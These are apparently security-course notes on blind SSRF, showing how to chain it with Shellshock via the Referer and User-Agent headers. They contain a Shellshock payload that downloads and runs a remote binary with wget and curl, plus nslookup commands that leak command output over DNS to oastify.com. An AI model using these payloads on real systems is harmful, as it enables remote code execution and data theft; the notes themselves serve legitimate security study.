# Section 19: Blind SSRF Vulnerabilities

## Introduction to Blind SSRF Vulnerabilities

In blind SSRF, you send a forged request exactly the same way as the normal SSRF, but **there will be NO RESPONSE**

The impact is a bit lower, but is some scenarios you could gain:
  - code execution
  - exploit vulnerabilities within the devices that are connected to the same network

We can blindly send exploit payloads to the devices on a network. 
These services are only internal not exposed to the Internet.
Server admins don't keep up these devices always up to date.

---

## Discovering Blind SSRF

We could send a forged request to get the vulnerable web server, hosting the vulnerable web application, to:
- send request **to a server that I control** as the hacker
- I can look at the logs, of my server, then I can see if I hijacked the web server and get it to send requests where it wasn't supposed to send requests to


**Example**

turn on Interceptor in Burp Suite ➡️ check _Referer value_ (in any request) with a full link ➡️ (test for open redirect vulnerabilities and SSRF)

- There are not going to appear that is working, but it is working (Blind SSRF)
- We need to modify the server to a location that we own and put it in Referer value
- read the logs to see if it got any requests


---


## Exploiting Blind SSRF Vulnerabilities

In the previous demonstration we cannot send information to our server, only send requests. Could use only as a proxy.

Example:

- Check request sent to the server
- Has User-Agent of the browser (not the server that we' are exploiting)

**Forged Request**

```
GET /?product=4 HTTP/1.1
Host: webserver.com
Cookie: session=c4mDUwJftlcCWRp1Z

User-Agent: Mozilla/5.0 (Windows NT)
Accept: text/html
Referer: https://server3.com

Accept-Encoding: gzip
connection: close
```


**Server 3**


```
GET / HTTP/1.1
Host: server3.com
User-Agent: Mozilla/5.0 (Windows NT)
```

### Exploit

**Forged Request**

```
GET /?product=4 HTTP/1.1
Host: webserver.com
Cookie: session=c4mDUwJftlcCWRp1Z

User-Agent: EXPLOIT
Accept: text/html
Referer: TARGET

Accept-Encoding: gzip
connection: close
```

**Target**

```
GET / HTTP/1.1
Host: TARGET
User-Agent: EXPLOIT
```

The exploit will be sent to the target as a user agent


- Google exploits that use user-agent
  - useragent server exploit

### Shellshock

Found shellshock vulnerability that could exploit via user-agent

A magic string when is sent to the server, it bypasses the filtering that is implemented by the web server,
and whatever value you put after this magic string will be executed as code, through the shell

```
() { :;}; /bin/bash -c "wget http://[redacted]/wp2 -O /tmp/w3;curl -o /tmp/w3 http://[redacted]/wp2;chmod +x /tmp/w3;sh /tmp/w3;rm -rf /tmp/w3*"
```

To see the results of the execution, we must have the server send the results to the hacker web server, can use `nslookup`

### nslookup

Can query DNS records and map a domain name to it's IP address:

```
nslookup $(. COMMAND) .myserver.com
```

```
nslookup $(. COMMAND_RESULT) .myserver.com
```

e.g.

```
nslookup $(uname).3295872502.oastify.com
```

---

## Escalating Blind SSRF to a Remote Code Execution (RCE)

**Forged Request**

```
GET /?product=4 HTTP/1.1
Host: webserver.com
Cookie: session=c4mDUwJftlcCWRp1Z

User-Agent: () {:;}; /usr/bin/nslookup $(.whoami) .myserver.com
Accept: text/html
Referer: https://target.com

Accept-Encoding: gzip
connection: close
```

**Target**

```
GET / HTTP/1.1
Host: target.com
User-Agent: () {:;}; /usr/bin/nslookup $(.whoami) .myserver.com
```

Burp Interceptor ➡️ send product GET request to Repeater ➡️ modify:

- Referer: `http://192.168.0.1/8080`
- User-Agent: `() {:;}; /usr/bin/nslookup $(whoami).3205932.oastify.com`

But referer is not vulnerable ➡️ Use Intruder

- Try all values from 1 to 254 in Referer (all possible IPs in the same range)
- Add s sign in 1
  - Payloads: number
  - From: 1
  - To: 254
  - Step: 1

In our server we have 2 DNS requests, the first part is the username
- now you can replace the whoami with any command you want to execute on the server
- it will execute it on the server
- and send the result to your own web server

full remote code execution on a target server through a Blind SSRF
- use one liner backdoor for interactive shell


---




